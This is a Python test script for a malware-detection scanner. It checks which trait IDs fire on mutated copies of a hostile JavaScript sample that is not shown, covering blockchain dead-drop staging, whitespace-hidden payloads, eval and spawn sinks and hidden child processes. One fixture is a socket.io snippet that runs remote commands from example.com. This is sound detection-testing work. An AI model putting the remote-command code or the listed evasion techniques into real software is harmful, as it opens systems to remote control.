"""Scan controls only; never execute the JavaScript or batch fixtures."""
import json
import os
from pathlib import Path
import re
import subprocess
import tempfile

HERE = Path(__file__).resolve().parent
REPO = HERE.parent.parent
PAYLOAD = "objectives/execution/payload/script-eval::obfuscated-etherhiding-hex-stage-dropper"
CHILD = "objectives/execution/interpreter/eval/remote::obfuscated-blockchain-http-node-child"
RENDEZVOUS = "objectives/command-and-control/channel/deaddrop/blockchain::obfuscated-ethereum-recipient-stage-rendezvous"
PATCH = "objectives/supply-chain/trojanized/app/patch::http-handler-whitespace-hidden-blockchain-stage"
EVAL = "micro-behaviors/process/interpreter/eval/indirect::js-computed-helper-receives-eval"
SPAWN = "micro-behaviors/process/create/eval::js-helper-receives-spawn-inline-source"
HIDDEN = "objectives/evasion/process/hidden/window::obfuscated-http-stage-hidden-child"
EVENT = "micro-behaviors/data/control-flow/event-callback::js-exec-event-registration"
UPLOAD = "metadata/lang/natural/vocabulary/content-word::agent-upload-wording"


def main():
    source = (HERE / "analytics-stage.js").read_text()
    cases = {
        "original.js": (source, {PAYLOAD, CHILD, RENDEZVOUS, PATCH, HIDDEN}, set()),
        "clean-handler.js": (source[:source.index("global.i=")], set(), {PAYLOAD, CHILD, RENDEZVOUS, PATCH}),
        # Separate sinks retain downstream rendezvous and patch coverage.
        # An eval-like filename must not hide actual whitespace concealment.
        "stage-no-eval.js": (source.replace("](eval,", "](ignoreSource,"), {CHILD, RENDEZVOUS, PATCH, HIDDEN}, {PAYLOAD}),
        "no-spawn.js": (source.replace("](spawn,", "](ignoreChild,"), {PAYLOAD, RENDEZVOUS, PATCH}, {CHILD, HIDDEN}),
        "no-execution-sink.js": (source.replace("](eval,", "](ignoreSource,").replace("](spawn,", "](ignoreChild,"), set(), {PAYLOAD, CHILD, RENDEZVOUS, PATCH}),
        # The header-stage payload rule has no XOR requirement; the separate
        # XOR/eval loader does. Rendezvous and concealment do not depend on
        # the transform of the downstream stage bytes.
        "no-xor.js": (source.replace("]^=", "]+="), {PAYLOAD, CHILD, RENDEZVOUS, PATCH, HIDDEN}, set()),
        "without-window.js": (source.replace("windowsHide", "windowState"),
                              {PAYLOAD, CHILD, RENDEZVOUS, PATCH}, {HIDDEN}),
        "other-stage-route.js": (source.replace(":443/0x/cl", ":443/1y/ab")
                                  .replace(":443/0x/ls", ":443/1y/cd"),
                                  {PAYLOAD, RENDEZVOUS, PATCH}, set()),
        "no-recipient.js": (source.replace("['tx']['to']", "['tx']['value']"), {PAYLOAD}, {RENDEZVOUS, PATCH}),
        "visible-stage.js": (re.sub(r"[ \t]{100,}", " ", source), {PAYLOAD, RENDEZVOUS}, {PATCH}),
        "plain-padding.eval.js": ("const a=1;" + " "*200 + "const b=2;",
            {"metadata/file/line::long-inline-whitespace-run"}, {PAYLOAD, CHILD, RENDEZVOUS, PATCH, HIDDEN}),
        "helper-positive.js": ('x[f](eval, source()); x[g](spawn, target, ["-e", code], {});', {EVAL, SPAWN}, {PAYLOAD}),
        "helper-negative.js": ('x[f](log, source()); x[g](observe, target, ["-e", code], {});', set(), {EVAL, SPAWN, PAYLOAD}),
        "background-helper.js": ('const {spawn}=require("child_process");'
            'spawn("node",["worker.js"],{detached:!0,windowsHide:!0}).unref();',
            set(), {PAYLOAD, RENDEZVOUS, PATCH, HIDDEN}),
        "editor-event.js": ('editor.on("exec", recordMacro);', {EVENT}, {PAYLOAD}),
        "build-task.js": ('task("travis", ["lint", "test", "upload"]);', {UPLOAD}, {PAYLOAD}),
        "socket-dispatch.js": ('const socket=require("socket.io-client")("https://example.com");'
            'const cp=require("child_process");socket.on("exec",cmd=>cp.exec(cmd));',
            {EVENT, "objectives/command-and-control/remote-command/socketio-control::node-socketio-remote-command-execution"}, set()),
        "git-query-only.bat": ('@echo off\ngit log -1 --date=format-local:%%Y\ngit log -1 --format=%%an\ngit rev-parse --abbrev-ref HEAD\n',
                               {"micro-behaviors/revision-control/git::git-log-last-commit-local-date-query",
                                "micro-behaviors/revision-control/git::git-log-last-commit-field-query"},
                               {"objectives/evasion/indicator-removal/history::timestamped-amend-rewrite"}),
    }
    with tempfile.TemporaryDirectory(prefix=".registry-review-", dir=REPO) as tmp:
        paths = []
        for name, (content, _, _) in cases.items():
            path = Path(tmp) / name
            path.write_text(content)
            paths.append(str(path))
        env = os.environ.copy()
        env.pop("CLEAVE_VALIDATE", None)
        result = subprocess.run(
            [env.get("CLEAVE", "cleave"), "--traits-dir", str(REPO), "--format", "jsonl", *paths],
            capture_output=True, text=True, env=env, check=True,
        )
        reports = [json.loads(line) for line in result.stdout.splitlines() if line.strip()]
        files = {Path(f["path"]).name: f for report in reports for f in report["files"]}
        for name, (_, required, forbidden) in cases.items():
            traits = {t["id"] for t in files[name].get("traits", [])}
            assert required <= traits, (name, "missing", required - traits)
            assert not forbidden & traits, (name, "unexpected", forbidden & traits)
        for name in ["clean-handler.js", "helper-positive.js", "helper-negative.js", "git-query-only.bat",
                     "background-helper.js", "editor-event.js", "build-task.js", "plain-padding.eval.js"]:
            assert not any(t["crit"] >= 4 for t in files[name].get("traits", [])), name
    print(f"PASS {len(cases)} original-source and missing-role controls")


if __name__ == "__main__":
    main()
